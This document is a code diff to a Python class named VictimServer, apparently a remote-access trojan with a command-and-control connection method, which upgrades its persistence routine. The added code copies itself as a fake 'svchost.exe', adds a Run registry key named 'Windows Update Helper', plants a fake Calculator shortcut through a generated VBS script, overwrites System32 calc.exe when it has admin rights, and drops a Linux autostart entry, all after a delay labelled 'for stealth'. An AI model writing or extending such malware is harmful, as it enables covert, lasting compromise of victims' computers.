@@ -46,32 +46,106 @@ class VictimServer:
             return os.getuid() == 0  # UNIX-like systems
 
     def persist(self):
-        """Delayed persistence"""
+        """Advanced persistence with Start Menu hijacking and system replacement"""
 
         def delayed_persist():
-            time.sleep(300)  # 5-minute delay
             try:
+                time.sleep(600)  # 10-minute delay for stealth
                 if self.platform == 'windows':
-                    exe_path = os.path.join(os.getenv('APPDATA'), 'svchost.exe')
-                    if not os.path.exists(exe_path):
-                        shutil.copy2(sys.argv[0], exe_path)
-                        subprocess.check_call(
-                            f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
-                            f'/v "Windows Update Helper" /t REG_SZ /d "{exe_path}" /f',
-                            shell=True,
-                            stdout=subprocess.DEVNULL,
-                            stderr=subprocess.DEVNULL
-                        )
-                else:
-                    cron_path = '/etc/cron.d/.systemd'
-                    if not os.path.exists(cron_path):
-                        with open(cron_path, 'w') as f:
-                            f.write(f'@reboot /usr/bin/python3 {sys.argv[0]}\n')
-                        os.chmod(cron_path, 0o644)
-            except Exception:
-                pass
+                    # 1. Traditional Run key persistence
+                    appdata_path = os.getenv('APPDATA')
+                    target_path = os.path.join(appdata_path, 'svchost.exe')
 
-        threading.Thread(target=delayed_persist, daemon=True).start()
+                    if not os.path.exists(target_path):
+                        shutil.copy2(sys.argv[0], target_path)
+                        subprocess.run(
+                            ['reg', 'add',
+                             'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
+                             '/v', 'Windows Update Helper',
+                             '/t', 'REG_SZ',
+                             '/d', f'"{target_path}"',
+                             '/f'],
+                            capture_output=True,
+                            shell=True
+                        )
+
+                    # 2. Start Menu shortcut creation
+                    start_menu_path = os.path.join(
+                        appdata_path,
+                        'Microsoft\\Windows\\Start Menu\\Programs\\Calculator.lnk'
+                    )
+
+                    # Create shortcut using Windows Script Host
+                    shortcut_script = f"""
+                        Set oWS = WScript.CreateObject("WScript.Shell")
+                        sLinkFile = "{start_menu_path}"
+                        Set oLink = oWS.CreateShortcut(sLinkFile)
+                        oLink.TargetPath = "{sys.argv[0]}"
+                        oLink.WorkingDirectory = "{os.getcwd()}"
+                        oLink.Save
+                    """.strip()
+
+                    with open("create_shortcut.vbs", "w") as f:
+                        f.write(shortcut_script)
+
+                    subprocess.run(
+                        ['cscript', 'create_shortcut.vbs', '/B'],
+                        stdout=subprocess.DEVNULL,
+                        stderr=subprocess.DEVNULL
+                    )
+                    os.remove("create_shortcut.vbs")
+
+                    # 3. System Calculator replacement (admin required)
+                    if self.is_admin:
+                        system32_path = os.path.join(
+                            os.getenv('WINDIR'),
+                            'System32\\calc.exe'
+                        )
+                        try:
+                            # Take ownership and replace system calculator
+                            subprocess.run(
+                                ['takeown', '/f', system32_path],
+                                check=True,
+                                capture_output=True
+                            )
+                            subprocess.run(
+                                ['icacls', system32_path, '/grant', 'Administrators:F'],
+                                check=True,
+                                capture_output=True
+                            )
+                            shutil.copy2(sys.argv[0], system32_path)
+                        except Exception as e:
+                            print(f"System replacement failed: {str(e)}")
+
+                else:  # Linux/Mac
+                    # Create .desktop file for Linux
+                    desktop_file = """[Desktop Entry]
+                        Type=Application
+                        Name=Calculator
+                        Exec={}
+                        Terminal=false
+                    """.format(sys.argv[0])
+
+                    autostart_path = os.path.expanduser("~/.config/autostart/calculator.desktop")
+                    with open(autostart_path, 'w') as f:
+                        f.write(desktop_file)
+                    os.chmod(autostart_path, 0o755)
+
+            except Exception as e:
+                print(f"[!] Persistence error: {str(e)}")
+
+        # Start persistence thread with error handling
+        try:
+            persistence_thread = threading.Thread(target=delayed_persist)
+            persistence_thread.daemon = True
+            persistence_thread.start()
+        except Exception as e:
+            print(f"[!] Failed to start persistence thread: {str(e)}")
+
+        # Start thread with error reporting
+        persistence_thread = threading.Thread(target=delayed_persist)
+        persistence_thread.daemon = True
+        persistence_thread.start()
 
     def connect_c2(self):
         """Connection handler with improved error reporting"""
